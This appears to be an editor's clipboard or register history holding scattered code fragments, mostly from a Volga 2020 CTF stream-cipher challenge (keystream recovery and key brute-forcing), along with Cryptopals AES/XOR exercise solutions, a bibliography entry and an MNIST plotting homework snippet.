4a0c62d569e537cf995c2e08e37661da|file:///home/neo/CTFs/volga2020/export/server.py|45|17|V|python
	                print(frame)
d55afc32673e8bb983a19eb2a2abe966|file:///home/neo/CTFs/volga2020/export/cipher.py|17|34|V|python
	            print(self.key[int(i/8)])
	            for j in range(4):
5090bdf121ed281ae4b38291558806ee|file:///home/neo/CTFs/volga2020/export/cipher.py|17|13|V|python
	            print(self.key[int(i/8)])
5e8ac862486e5b836ab681c596eed35c|file:///home/neo/CTFs/volga2020/export/cipher.py|91|1|V|python
	    stream1 = ""
	    print("Stream 1")
	    for byte in test_keystream1:
	        stream1 += "{0:b}".format(byte).ljust(8,'0')
	        print("{0:b}".format(byte).ljust(8,'0'))
641c48479ca10e99d7b0b22d077386da|file:///home/neo/CTFs/volga2020/export/cipher.py|112|5|V|python
	    stream1 = ""
eae835e83c0494a376229f254f7d3392|file:///home/neo/CTFs/volga2020/export/cipher.py|112|12|v|python
	Stream
6120a2f1fbf8e107b4ec766366104c7a|file:///home/neo/CTFs/volga2020/export/cipher.py|113|17|v|python
	test_keystream1
691d6b68af18b1f25bcd2e25d8a40640|file:///home/neo/CTFs/volga2020/export/cipher.py|114|9|V|python
	        stream1 += "{0:b}".format(byte).ljust(8,'0')
29718fd5c0329ae15b818de61e9df92c|file:///home/neo/CTFs/volga2020/export/decrypt.py|6|15|v|python
	FaQ5JLy5XsntjS9tKVwh
f4c60c61826df591d99bfe7d9a0e75c7|file:///home/neo/CTFs/volga2020/export/decrypt.py|7|3|v|python
	dMVYRd3YP6iM7E4MSD0hDWO
a9370a6d93706b7472efb9f520acecb2|file:///home/neo/CTFs/volga2020/export/decrypt.py|7|3|v|python
	dMVYRd3YP6iM7E4MSD0hDWO+yvFqOPOFkI2ZWOOhywM2GRRsU5wUZt7FOCRhxT1kswzIZbd4Iftw884hqz+kNDKHbMTss/ZlK4shZLptbzCwIlVSwdRB8A4h
e5a78ec149191b5ffc1a7467c245eeda|file:///home/neo/CTFs/volga2020/export/server.py|35|26|v|python
	YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQ==
7733b38137da5e163c45fe67a4472932|file:///home/neo/CTFs/volga2020/export/decrypt.py|4|14|v|python
	YQ==
9604a19e1cf1d982d33cc4d4523056cf|file:///home/neo/CTFs/volga2020/export/decrypt.py|5|1|v|python
	YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQ
5a95c3199c9a96b50a1154f40cc0a379|file:///home/neo/CTFs/volga2020/export/decrypt.py|13|22|^v|python
	[frame*15:(frame+1)*15]
fb801976f9cb213df24b928dbecfac8d|file:///home/neo/CTFs/volga2020/export/decrypt.py|21|1|V|python
	    print(a)
8a635fcde44f57228d59f8034265f96e|file:///home/neo/CTFs/volga2020/export/decrypt.py|20|1|V|python
	for (a,b,c,d,e,f,g,h in range(5):
	    print(a)
	    print(b)
	    print(c)
	    print(d)
	    print(e)
	    print(f)
	    print(g)
	    print(h)
8567e57af56c8a4e8d7114474a89dcb3|file:///home/neo/CTFs/volga2020/export/decrypt.py|20|1|V|python
	for a in range(256):
1889dd3d254d4663a40242290d758197|file:///home/neo/CTFs/volga2020/export/decrypt.py|21|1|V|python
	    for a in range(256):
7d3afadfa134f91f144339cf4a9ae9ca|file:///home/neo/CTFs/volga2020/export/decrypt.py|26|1|V|python
	                        for a in range(256):
ff78eb118db52f0d88b4df3f181e453c|file:///home/neo/CTFs/volga2020/export/decrypt.py|20|1|V|python
	for a in range(256):
	    for b in range(256):
	        for c in range(256):
	            for d in range(256):
	                for e in range(256):
	                    for f in range(256):
	                        for g in range(256):
	                            for h in range(256):
5615cb8bf3a296ac36933465354d54fc|file:///home/neo/CTFs/volga2020/export/decrypt.py|28|33|V|python
	                                print(key)
851541a5610491657b8f3caae2141ef2|file:///home/neo/CTFs/volga2020/export/server.py|48|1|V|python
	                for _ in range(114):
	                    k_block = (k_block << 1) + cipher.next_bit()
	                    # print("K-block: %s" % "{0:b}".format(k_block))
	                k_block_bits = "{0:b}".format(k_block)
4c34e3a2ec3d46c94068b1464a4908e2|file:///home/neo/CTFs/volga2020/export/server.py|46|1|V|python
	                cipher = Cipher(key, frame)
dcf3e36ee8115282aad46485cab6a4be|file:///home/neo/CTFs/volga2020/export/decrypt.py|29|58|v|python
	frame
0b979a4536a35f22c1b24c1fe27122ec|file:///home/neo/CTFs/volga2020/export/decrypt.py|33|37|V|python
	                                    print("K-block: %s" % "{0:b}".format(k_block))
89e0fa20bcfd8b22cf3c1f97e5445c2e|file:///home/neo/CTFs/volga2020/export/decrypt.py|33|33|V|python
	                                print(k_block)
8fb5e2f7d112b89a7429aa32cdd449dc|file:///home/neo/CTFs/volga2020/export/decrypt.py|30|33|V|python
	                                    cipher = Cipher(key, 0)
ce7fbd51df0b8880835025ce1752b67b|file:///home/neo/CTFs/volga2020/export/decrypt.py|31|33|V|python
	                                print(cipher)
3d19d0b7f31a626a8dd23113c7097f19|file:///home/neo/CTFs/volga2020/export/decrypt.py|32|37|V|python
	                                    k_block = 0
a702a3acb5746b94848481a49fa9f995|file:///home/neo/CTFs/volga2020/export/decrypt.py|34|33|V|python
	                                    print(k_block)
0541742bf56e42ee4eaba4811d704e60|file:///home/neo/CTFs/volga2020/export/decrypt.py|9|3|v|python
	Rk1Q3ptN8k1ttLAd0uch/LQTLflCzdNlEwMfDOMhxnTOtu26i9MsTxFrl7KhSyE7mlQd3hdxjMlAjvghJsDDMtUuGF0Eu/enpvzhCDnSGWl7pkqaF57Bqtzh
76d9ad9e4377e46fcd350318024add06|file:///home/neo/CTFs/volga2020/export/decrypt.py|9|3|v|python
	lCnuLT3vC5gQZWdayU3hV1t+5CVMJsG7/eX7MZZh6tJA2GtbctqlaljJgQ9hhe0vT9aA8cNvqOMGbVvhewRYYrqTzviKBc7NV+Shpz1KLQi/hqR5feVH5uvh
42ea847f60883f89660021b5315db0cf|file:///home/neo/CTFs/volga2020/export/decrypt.py|1|1|V|python
	#!/usr/lib/python3
	import base64
	from cipher import Cipher
	
	plaintext = "YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQ=="
	
	message: bytes = base64.b64decode(plaintext.strip())
	ciphertext = 'lCnuLT3vC5gQZWdayU3hV1t+5CVMJsG7/eX7MZZh6tJA2GtbctqlaljJgQ9hhe0vT9aA8cNvqOMGbVvhewRYYrqTzviKBc7NV+Shpz1KLQi/hqR5feVH5uvh'
	cipher_bytes: bytes = base64.b64decode(ciphertext.strip())
	ciphertext_bits = "{0:b}".format(int.from_bytes(cipher_bytes, byteorder='big'))
	# print("Cipher bits:  %s" % ciphertext_bits)
	n_blocks = int(len(message) / 15) + 1
	keystream = []
	for frame in range(n_blocks):
	    p_block = message[frame*15:(frame+1)*15]
	    p_block = int.from_bytes(p_block, byteorder='big')
	    c_block = int.from_bytes(cipher_bytes[frame*15:(frame+1)*15] , byteorder='big')
	    # print("Plain bits:   %s" % "{0:b}".format(p_block).rjust(118,'0'))
	    keystream.append((p_block ^ c_block) >> 6)
	for i in range(n_blocks):
	    print("Keystream %d:    %s" % (i , "{0:b}".format(keystream[i])))
9f92ae14768556bd47acd9d8cfcf1e02|file:///home/neo/CTFs/volga2020/export/decrypt.py|9|3|v|python
	0vmpMQzSw4J6+r63lizhBsxtxpAdKf1vV4LHVRuhe9qKiK74GmecL6hfQ/ghFRNJgiICklnbUNQdAhYhtNj/Dnb6O5OdX12cvcBhEXC9g6Eh0gLv5m2y4rXh
061a22bcec03d28cf49861dd303c50f3|file:///home/neo/CTFs/volga2020/export/decrypt.py|37|42|V|python
	                                # print(key)
	                                # print(k_block_bits)
	                                # print(keystream[0])
4f04d2df30c44223c50b2350f08e3c76|file:///home/neo/CTFs/volga2020/export/decrypt.py|41|1|V|python
	
	# for a in range(256):
	#     for b in range(256):
	#         for c in range(256):
	#             for d in range(256):
	#                 for e in range(256):
	#                     for f in range(256):
	#                         for g in range(256):
	#                             for h in range(256):
	
	
	        
	
40747be471f83984899549135d0b7ed1|file:///home/neo/CTFs/volga2020/export/decrypt.py|9|3|v|python
	zV/5iNE5+y54v7l80IThu4Gyn5dyH3dxFigYn0zhNPSwV62TZDg2CjEcDObhsU3ULvSHiTeN+LILhK8hD1O8QxxJUH30tfkY9fthE+UOwdUTUzLz3RB+3Wsh
bbe537c6ab8724f92d46634ef6bf0571|file:///home/neo/CTFs/volga2020/export/decrypt.py|14|1|V|python
	for frame in range(n_blocks):
c1254899bc873953ac74ec4ccce078b1|file:///home/neo/CTFs/volga2020/export/decrypt.py|23|42|^v|python
	"{0:b}".format(keystream[i])
8892763e80a81964235220ba93c03b73|file:///home/neo/CTFs/volga2020/export/decrypt.py|20|17|v|python
	[] * n_blocks
ffaea4c8af845ca28000f68b2f8677e8|file:///home/neo/CTFs/volga2020/export/decrypt.py|28|9|V|python
	        print(byte)
c676ed1d3bec334e54b7133560eb6275|file:///home/neo/CTFs/volga2020/export/decrypt.py|24|16|v|python
	[[]]
c7577b3cb9f0c3afd27f56207481152b|file:///home/neo/CTFs/volga2020/export/cipher.py|80|1|V|python
	    iv = 0x00
aad0ba4f3f0b2cb169a19c44e25430e8|file:///home/neo/CTFs/volga2020/export/decrypt.py|1|1|V|python
	#!/usr/lib/python3
	import base64
	from cipher import Cipher
	
	plaintext = "YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQ=="
	
	message: bytes = base64.b64decode(plaintext.strip())
	ciphertext = 'zV/5iNE5+y54v7l80IThu4Gyn5dyH3dxFigYn0zhNPSwV62TZDg2CjEcDObhsU3ULvSHiTeN+LILhK8hD1O8QxxJUH30tfkY9fthE+UOwdUTUzLz3RB+3Wsh'
	cipher_bytes: bytes = base64.b64decode(ciphertext.strip())
	ciphertext_bits = "{0:b}".format(int.from_bytes(cipher_bytes, byteorder='big'))
	# print("Cipher bits:  %s" % ciphertext_bits)
	n_blocks = int(len(message) / 15) + 1
	keystream = []
	for frame in range(n_blocks):
	    p_block = message[frame*15:(frame+1)*15]
	    p_block = int.from_bytes(p_block, byteorder='big')
	    c_block = int.from_bytes(cipher_bytes[frame*15:(frame+1)*15] , byteorder='big')
	    # print("Plain bits:   %s" % "{0:b}".format(p_block).rjust(118,'0'))
	    keystream.append((p_block ^ c_block) >> 6)
	keystream_str = {}
	for i in range(n_blocks):
	    keystream_str[i] = "{0:b}".format(keystream[i])
	#     print("Keystream %d:    %s" % (i , "{0:b}".format(keystream[i])))
	stream_bytes = {} 
	for i in range(n_blocks):
	    stream = []
	    for j in range(0,64,8):
	        byte = keystream_str[i][j:j+8]
	        stream.append(hex(int(byte,2)))
	    stream_bytes[i] = stream
	    print(stream_bytes[i])
f5273a40c8bb8c1bfdfee76407eebe7c|file:///home/neo/CTFs/volga2020/export/decrypt.py|5|77|v|python
	YmJiYmJiYg==
40c4f842e18c70f3b448cd177860f2eb|file:///home/neo/CTFs/volga2020/export/decrypt.py|5|1|v|python
	YmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYg==
52c45d5df104823bfe3cb29fc81bf3f3|file:///home/neo/CTFs/volga2020/export/decrypt.py|7|3|v|python
	zlz6i9I6+C17vLp/04fiuIKxnJRxHHRyFSsbnE/iN/ezVK6QZzs1CTIfD+Xisk7XLfeEijSO+7EIh6wibjLdIn0oMRyV1Jgb9vhi
930d17cfe9739079b61151be894aafdf|file:///home/neo/CTFs/volga2020/export/decrypt.py|6|1|v|python
	
59aebd6c5de2b6b983ef5d6d769425eb|file:///home/neo/CTFs/volga2020/export/decrypt.py|10|3|v|python
	7X/ZqPEZ2w5Yn5lc8KTBm6GSv7dSP1dRNgg4v2zBFNSQd42zRBgWKhE8LMbBkW30DtSnqRet2JIrpI8BL3OcYzxpcF3Uldk41dtBUqRPgJRSEnOynFE/nCoBZxheSTbMMSmh6qP07mOBorkDb6qEO6JMPb1npX/B8tpAmOoOr0M2nmY1QMJB+Ac4cY7qy9YSyIfxVCyB+OJBLmZJoF7i6dnb9eOBNE+qpUe0SNRCM6F6REGBnxLMGFYE+MfGhCJSebGBKyVqSug8OLm8I72F4TdBPYZ9Ok4iTtIxtSLbsz3BydftK9GO9B0rkvzwj3GBZLWdd2FZVPOisCi3sc0BJp2G9HipGH8hZ5N+dM8BQ4ml25Z/sqg6xLOj3hSBWFRjwiNN0EtbfwRjDivBOpR63Vul3mwc8ARGFh9B8MxmJcxWuWycB9XdKmLBrUkaoGIYccKd0S90wldBMAlF++k+7kEHf5LTzo+BLEM+5lzDJO44aa8I6YrBvWgOpGWJxZjptg6o1cNBEFa6Req6vNYq9KNd07ZBvPP0brvTNUeJcaVeliFBWMQeM1lF/4dUOQWX0WGBaE69ji2b+aiDiH2SIvLBvu6JzSlh2X+gJ6kA7xIBUdu8CPGEsEsMJqKink6BsjlwHB/djAlew1gB1efBktCrZdpDoEfu/1dwvIDK
1a4d42b5f3e09b510d3380e1d1459d14|file:///home/neo/CTFs/volga2020/export/cipher.py|78|1|V|python
	    iv = 0x21
a8bc268c7ccaf408eb267e0e220df9d0|file:///home/neo/CTFs/volga2020/export/cipher.py|112|13|V|python
	    for byte in output:
	        print("{0:b}".format(byte).ljust(8,'0'))
04cdcf3c23952eee3718ac2ed88c1be7|file:///home/neo/CTFs/volga2020/export/cipher.py|112|5|V|python
	    for byte in output:
40ea57d3ee3c07bf1c102b466e1c3091|file:///home/neo/CTFs/volga2020/export/cipher.py|112|26|v|python
	byte
45901e2f9827c50b3e9cbb660a8d1489|file:///home/neo/CTFs/volga2020/export/cipher.py|112|33|v|python
	.ljust(8,'0'
ad936a0f6041a96ba9cfedda57e24d56|file:///home/neo/CTFs/volga2020/export/cipher.py|112|11|v|python
	"{0:b}".format(output
dea438bfdf9bd8e85aa90bd1af103e37|file:///home/neo/CTFs/volga2020/export/decrypt.py|15|1|V|python
	print(n_blocks)
8d94c14ffd7aca647b7d07afd9d88816|file:///home/neo/CTFs/volga2020/export/decrypt.py|24|5|V|python
	    print(len(keystream[i]))
485a872d33b510c146b1d5bbbbd53921|file:///home/neo/CTFs/volga2020/export/decrypt.py|21|5|V|python
	    print(keystream[frame])
7a7a7c9eb7af612f390f0c2fcf23629e|file:///home/neo/CTFs/volga2020/export/decrypt.py|24|1|V|python
	    print(len(keystream_str[i]))
b66f9a25e0e3b4bb39e87f05e44ac203|file:///home/neo/CTFs/volga2020/export/cipher.py|24|13|V|python
	            print(framebit)
c50e41c05738665101267d691d794ef1|file:///home/neo/CTFs/volga2020/export/cipher.py|24|27|v|python
	int(framebit, 2)
fb9a96336ee55d46d3c0aaa1707f1172|file:///home/neo/CTFs/volga2020/export/server.py|63|1|V|python
	            # print("Ciphertext %s" % ciphertext)
d384ed93b9a36426ecb1181b3dc2c732|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|66|1|V|bib
	@misc{supercop_ed25519,
	  title = {Supercop benchmarking tool},
	  howpublished = {\url{https://bench.cr.yp.to/supercop.html}}
	}
f7f567991c051f5ffeb054eb278a01f1|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|2|12|v|bib
	Supercop
33cb5df217581abf846e1ee7ba7cfeaa|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|2|12|v|bib
	 benchmarking tool
384659e9f75145323b49ec26a95ae344|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|2|24|v|bib
	https://keybase.io/
87ec9bcc638443a6180577ec957a507c|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|7|v|bib
	supercop_ed25519
bcc1a7ba680ed1fcd25d28d261ea4692|file:///home/neo/CTFs/volga2020/export/decrypt.py|10|14|v|python
	"dOyWsyGwpdKogcS9yXghCWFnDsCfpW2xGMFWDL8hV1nKCyXvTmZ++xF2W+mhcTzOYjlUBcmPwpDRNHdhZM8yueQqwt2G55pAf11h502C5LDZWjZfvxEDtvlh"
936ffafe5e074742b9f1869521df7bac|file:///home/neo/CTFs/volga2020/export/decrypt.py|10|137|v|python
	'dOyWsyGwpdKogcS9yXghCWFnDsCfpW2xGMFWDL8hV1nKCyXvTmZ++xF2W+mhcTzOYjlUBcmPwpDRNHdhZM8yueQqwt2G55pAf11h502C5LDZWjZfvxEDtvlh'
3ba6a5144afc5afe9daaed3deff39cd9|file:///home/neo/CTFs/volga2020/export/decrypt.py|10|137|v|python
	'CWFnDsCfpW2xGMFWDL8hV1nKCyXvTmZ++xF2W+mhcTzOYjlUBcmPwpDRNHdhZM8yueQqwt2G55pAf11hhizjhdG4O1c+3nBi15hhmeD2DG5oZO097pFZJWah'
de9c3d123e73c8431581e510bbc1f26a|file:///home/neo/CTFs/volga2020/export/decrypt.py|10|137|v|python
	'YlRkTb2an4y/L+62EUEhlSTcqsmni+AVFVorrDjhD2UUVGRfh+GI/OFzonehtgTRLqXjw395y3GiiBBh6jp3/yhoXUl1rhny+ushdit3o6s4SVQgOrjCvj/h'
d54126034ccf2d175030184539a19aac|file:///home/neo/PycharmProjects/epl448_as2/epl448-as2.py|1033|1|v|python
	# Task t5a:
	# Plot the average value of all digits
	
	# Do not change anything below
	plt.figure()
	fig, axes = plt.subplots(2, 5, figsize=(15, 4))
	
	for i in range(10):
	    t5a_row, t5a_col = i // 5, i % 5
	
	    # Change below: Create a subset of p5_train_data with images containing only digit i
	    # Possible to do it 1 linear (similar to how it is done in Pandas)
	    t5a_digit_i_subset = p5_train_data[p5_train_labels == i]
	
	    # Compute avg value of t5a_training_data_sevens_only and t5a_training_data_nines_only
	    # remember to use a vectorized version of mean for efficiency
	    t5a_digit_i_subset_mean = np.mean(t5a_digit_i_subset, axis=0)
	
	    # Do not change below
	    axes[t5a_row][t5a_col].imshow(t5a_digit_i_subset_mean.reshape(28, 28), cmap="Greys")
	    axes[t5a_row][t5a_col].grid(False)
	    axes[t5a_row][t5a_col].get_xaxis().set_ticks([])
	    axes[t5a_row][t5a_col].get_yaxis().set_ticks([])
	
	#
bca906bf87a2fa94abdeb9bd1fa9c5cb|file:///home/neo/CTFs/volga2020/export/cipher.py|109|1|V|python
	    output = [0] * 15
	    for i in range(114):
	        output[int(i / 8)] |= cipher.next_bit() << (7 - (i & 7))
	    if output == test_keystream1:
	        print('Test#1: OK')
	    print("Output 1")
	    print(output)
d4c23b0496b3448d1f38761deb0ac3af|file:///home/neo/CTFs/volga2020/export/cipher.py|112|9|V|python
	        if output == test_keystream1:
	            print('Test#1: OK')
	        print("Output 1")
cf4ebe5f0a5923ffd806ccdc3f5be966|file:///home/neo/CTFs/volga2020/export/cipher.py|114|9|V|python
	        print(output)
7d5f19734ac081748897ef371b040635|file:///home/neo/CTFs/volga2020/export/cipher.py|113|55|v|python
	a_list
fe3d76ed88e5bc59954d285d1338355a|file:///home/neo/CTFs/volga2020/export/cipher.py|108|1|V|python
	    cipher = Cipher(key, iv)
	    while(1):
	        output = [0] * 15
	        for i in range(114):
	            output[int(i / 8)] |= cipher.next_bit() << (7 - (i & 7))
	        print('[{}]'.format(', '.join(hex(x) for x in output)))
b2f34eb4c83495dbdbc4c3d5dda28c63|file:///home/neo/CTFs/volga2020/export/cipher.py|107|5|V|python
	    cipher = Cipher(key, iv)
ecebfb276a676cb6fe22b8ca6edc9e93|file:///home/neo/CTFs/volga2020/export/cipher.py|113|1|V|python
	            output[int(i / 8)] |= cipher.next_bit() << (7 - (i & 7))
19bcae694b34cc2a37d1f33352c13cd2|file:///home/neo/CTFs/volga2020/export/server.py|49|1|V|python
	                    k_block = (k_block << 1) + cipher.next_bit()
8ecb4d0779b5b559387677833afd4744|file:///home/neo/cryptopals/set1/set1_sol.py|154|1|V|python
	def decrypt_aes_ecb(ciphertext, key):
	    cipher = AES.new(key, AES.MODE_ECB)
	    return cipher.decrypt(ciphertext).decode('utf-8')
586e15f34830aa5a0dca69c2d7adefbd|file:///home/neo/cryptopals/set2/set2_sol.py|15|5|v|python
	aes_cbc_decrypt
a07f3928d807fe822306647eff63ecd6|file:///home/neo/cryptopals/set1/set1_sol.py|179|1|V|python
	    enc_file = open('set1/7.txt', 'r')
	    enc_text = bytearray(enc_file.read(), 'utf-8')
	    ciphertext = codecs.decode(enc_text, 'base64')
	    key = b'YELLOW SUBMARINE'
	    plaintext = decrypt_aes_ecb(ciphertext, key) 
	    print(plaintext)
1169f12c31f2c77c546cbfb2202eedcb|file:///home/neo/CTFs/volga2020/export/server.py|42|1|V|python
	            for frame in range(n_blocks):
	                # p_block = message[frame*15:(frame+1)*15]
	                p_block = message[frame*15:(frame+1)*15]
	                p_block = int.from_bytes(p_block, byteorder='big')
	                cipher = Cipher(key, frame)
8bbf85c1de8cfeecc197ef1ab906087d|file:///home/neo/cryptopals/set2/set2_sol.py|22|5|V|python
	    print(len(enc_text))
72e155c3b274219ddbf761437d3bed0a|file:///home/neo/cryptopals/set2/set2_sol.py|24|5|V|python
	    # ciphertext = codecs.decode(enc_text, 'base64')
f2f66359a4d7193f9d43d15250a92de0|file:///home/neo/cryptopals/set2/set2_sol.py|26|5|V|python
	    plaintext = codecs.encode(plaintext, 'base64')
7e6d0775cb683618bfd109b2e81e6d5f|file:///home/neo/cryptopals/set2/set2_sol.py|26|5|v|python
	laintext
4ad6ef6a04056e205d412514711096a1|file:///home/neo/cryptopals/set2/set2_sol.py|23|5|v|python
	enc_text
32be76b12d3f2cc64233ebfdaa6122c8|file:///home/neo/cryptopals/set2/set2_sol.py|18|5|V|python
	    plain
9d96b9ddedc97fb64b96f453f81bf808|file:///home/neo/cryptopals/set2/set2_sol.py|17|1|V|python
	    block = encrypt_aes_ecb(ciphertext[:16], key)
	    block = xor_hex(block, iv)
54092532d18833b7f355ae19f12d8e30|file:///home/neo/cryptopals/set2/set2_sol.py|19|5|V|python
	    print(block)
c1565fe33197de7bf26f24586751adab|file:///home/neo/cryptopals/set2/set2_sol.py|34|10|^v|python
	\x00"
20c462feee0caa4a9942fa6905c3e636|file:///home/neo/cryptopals/set2/set2_sol.py|34|10|^v|python
	\x00\x00\x00
02c39ac5324c13f8bd6c832b870a6754|file:///home/neo/cryptopals/set2/set2_sol.py|34|10|^v|python
	\x00\x00\x00\x00\x00\x00\x00\x00"
5c745639223144c84e70294796407c56|file:///home/neo/cryptopals/set2/set2_sol.py|20|5|V|python
	    print(iv)
52fd5d2929c4b7ed53d9a1543de8a4a5|file:///home/neo/cryptopals/set2/set2_sol.py|36|14|v|python
	\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
c3ba51d0aa1a7d37e64bdadcc7e22e1f|file:///home/neo/cryptopals/set2/set2_sol.py|19|18|V|python
	    print(len(iv))
	    print(len(block.hex()))
b7fcaeae7fae51906b208ce3df2c910f|file:///home/neo/cryptopals/set2/set2_sol.py|19|27|V|python
	    print(len(block.hex()))
	    print(len(iv))
38b7c90784838b40a4e2268320246c51|file:///home/neo/cryptopals/set2/set2_sol.py|17|1|V|python
	    cipher_block = ciphertext[:16]
	    block = encrypt_aes_ecb(cipher_block, key)
	    plain_block = xor_hex(block.hex(), iv)
	    plaintext += plain_block
a2de923f29a3ddb28c8c0019e93c4cd9|file:///home/neo/cryptopals/set2/set2_sol.py|25|12|v|python
	str(bytes.fromhex(plaintext))
516949e5fa8e5d03fd63e4dec237d62b|file:///home/neo/cryptopals/set2/set2_sol.py|17|26|v|python
	ytearray(iv, 'utf-8')
2bb321386b7162e6dca7cda66240a728|file:///home/neo/cryptopals/set1/set1_sol.py|47|12|v|python
	''.join((c1 ^ c2) for c1,c2 in (bytes1, bytes2))
9fc31b90433ef4eb737b1fabdde141e6|file:///home/neo/cryptopals/set1/set1_sol.py|45|1|V|python
	    str1 = str(bytes1)
a44801a7a0e742e9c7a7556b9b22a51d|file:///home/neo/cryptopals/set1/set1_sol.py|47|18|v|python
	bytes1
bee9b1b7fd1bad78eceac5c535b4fc88|file:///home/neo/cryptopals/set2/set2_sol.py|22|9|V|python
	        print(len(prev_cipher_block)
d3e0317811626c5f2592d2217c342c60|file:///home/neo/cryptopals/set2/set2_sol.py|21|9|V|python
	        print(len(bytearray(block, 'utf-8')))
8175343e1f90be52316960cc2849e824|file:///home/neo/cryptopals/set2/set2_sol.py|16|1|V|python
	    plaintext = ""
	    cipher_block = ciphertext[:16]
	    block = decrypt_aes_ecb(cipher_block, key)
	    plain_block = xor_hex(bytearray(block, 'utf-8').hex(), iv)
	    plaintext += plain_block
	    print(plaintext)
	    for i in range(16, len(ciphertext), 16):
	        cipher_block = ciphertext[i:i+16]
	        block = decrypt_aes_ecb(cipher_block, key)
	        plain_block = xor_hex(block.hex(), cipher_block.hex())
	        plaintext += plain_block
	    return str(bytes.fromhex(plaintext))
610cbc17719a49665d06d0899216641e|file:///home/neo/cryptopals/set2/set2_sol.py|28|1|V|python
	    plaintext
16348c76d3372b78f8e1cd71f94696aa|file:///home/neo/cryptopals/set2/set2_sol.py|21|9|V|python
	        print(dec_block)
966016492571160ed6c35cc8ad528250|file:///home/neo/cryptopals/set2/set2_sol.py|21|9|V|python
	        print(prev_cipher_block)
3507b20e61af4d00d3488723dce9e076|file:///home/neo/cryptopals/set2/set2_sol.py|21|1|V|python
	        dec_block_bytes = bytearray(dec_block, 'utf-8')
86c9d90eb51ea5a29f6fa54d3e570fea|file:///home/neo/cryptopals/set2/set2_sol.py|23|1|V|python
	        print(len(dec_block_bytes.hex()))
2256786e376c7a53d3bfdd9b8fa2095a|file:///home/neo/cryptopals/set2/set2_sol.py|23|1|V|python
	        print(len(dec_block_bytes))
e0aef737dd5bdce121e8e22ac9d065ea|file:///home/neo/cryptopals/set2/set2_sol.py|22|9|V|python
	        prev_cipher_block_bytes = bytearray(prev_cipher_block, 'utf-8')
610f84aa744282d2cd7feb0dd8e09ee2|file:///home/neo/cryptopals/set2/set2_sol.py|23|9|V|python
	        print(dec_block_bytes)
de619da8ac0fe2e28f8db93966e70d0c|file:///home/neo/cryptopals/set2/set2_sol.py|17|25|v|python
	str(iv)
13e3a3a05c504fd9686cf25f3c76c45e|file:///home/neo/cryptopals/set1/set1_sol.py|44|6|V|python
	    xored = ''
	    str1 = str(bytes1)
	    str2 = str(bytes2)
6f69114d589bb0644cc98136a27bf1e1|file:///home/neo/cryptopals/set1/set1_sol.py|45|18|v|python
	range(len(str1)):
367427e4ef4b4a21da0dae03684f8d50|file:///home/neo/cryptopals/set1/set1_sol.py|46|14|v|python
	 += chr(ord(str1[i]) ^ ord(str2[i]))
6833a7ef48745e446b8116787ee355c6|file:///home/neo/cryptopals/set1/set1_sol.py|45|17|v|python
	zip(bytes1, bytes2) 
f9d75d82149805d166af615620539e2c|file:///home/neo/cryptopals/set1/set1_sol.py|47|12|v|python
	bytearray(xored, 'utf-8')
b4a88417b3d0170d754c647c30b7216a|file:///home/neo/cryptopals/set1/set1_sol.py|47|18|v|python
	result
a72bb92bb7fadc4cae8a0fa38c3acc26|file:///home/neo/cryptopals/set1/set1_sol.py|47|12|v|python
	bytes(xored) 
63036388356df5397751a8c03911fd81|file:///home/neo/cryptopals/set1/set1_sol.py|218|1|V|python
	    print(input1)
12ad435696e06746cf0e644c9b7cbd4e|file:///home/neo/cryptopals/set1/set1_sol.py|218|4|V|python
	    print(input1)
	    print(input2)
bbb6e9f2293618dff8f9058ce132379e|file:///home/neo/cryptopals/set1/set1_sol.py|214|13|v|python
	single_byte_xor('1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736', 100)
6facae1db22ba0158bad146aabbb9c31|file:///home/neo/cryptopals/set1/set1_sol.py|58|5|V|python
	    hexnum = bytes.fromhex(hexstring)
e95810a6480b69163a2fd0674bf89fe7|file:///home/neo/cryptopals/set1/set1_sol.py|61|21|v|python
	hexnum
a64ed50f83207f60bd5fe5890a62c4e4|file:///home/neo/cryptopals/set1/set1_sol.py|213|30|v|python
	'1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736'
d2bcb196158526eef00a653fe4235455|file:///home/neo/cryptopals/set1/set1_sol.py|209|5|V|python
	    ct = 
2f56711a2b0241955a33507ecf76a59b|file:///home/neo/cryptopals/set1/set1_sol.py|209|5|V|python
	    print(bytes.fromhex(lines))
580738d968a4bfd39882e350e6004793|file:///home/neo/cryptopals/set1/set1_sol.py|212|5|V|python
	    print(ct)
703666e2fae2ae186c2d66087fb9c449|file:///home/neo/cryptopals/set1/set1_sol.py|87|5|V|python
	    print(lines)
8904fbbaac2eb32fc4e150f203d4d6c2|file:///home/neo/cryptopals/set1/set1_sol.py|107|28|v|python
	fromhex
3d7f523e1bfd444728904592fa3636b3|file:///home/neo/CTFs/volga2020/export/z3-export.py|1|1|V|python
	import z3
	import sys
	import base64
	
	"""
	    Communication utils
	"""
	
	def read_message():
	    return sys.stdin.readline()
	
	
	def send_message(message):
	    sys.stdout.write('{0}\r\n'.format(message))
	    sys.stdout.flush()
	
	def eprint(*args, **kwargs):
	    print(*args, file=sys.stderr, **kwargs)
	
	key = [0x00, 0xfc, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff]
	iv = 0x21
	test_keystream1 = [0xf4, 0x51, 0x2c, 0xac, 0x13, 0x59, 0x37, 0x64, 0x46, 0x0b, 0x72, 0x2d, 0xad, 0xd5, 0x00]
